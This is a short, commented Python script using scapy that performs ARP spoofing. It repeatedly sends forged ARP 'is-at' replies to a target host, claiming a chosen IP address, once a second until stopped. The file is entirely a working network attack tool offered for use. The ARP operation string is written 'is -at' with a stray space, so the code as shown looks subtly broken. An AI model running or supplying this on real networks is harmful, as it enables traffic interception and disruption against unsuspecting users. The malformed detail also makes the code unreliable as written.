#!/usr/bin/python3

import sys
import time
from scapy.all import sendp , ARP , Ether

# Here we import the required libraries

target_ip = sys. argv[1]
fake_ip = sys.argv[2]
iface = sys.argv[3]

# Here we set the target ip, spoofed ip, and network interface according to our CL input

ethernet = Ether()
# This creates an Ethernet header object

arp = ARP(pdst=target_ip ,
        psrc=fake_ip ,
        op="is -at")
# This creates an ARP header object with the target IP address set to target_ip, the source IP address set to fake_ip, and the operation set to "is-at".

packet = ethernet / arp
# Here we create an actual packet by combining the Ethernet and ARP header objects

while True:
    sendp(packet , iface=iface)
    time.sleep(1)

# here we create a loop which will send the packet every second until we press ctrl + c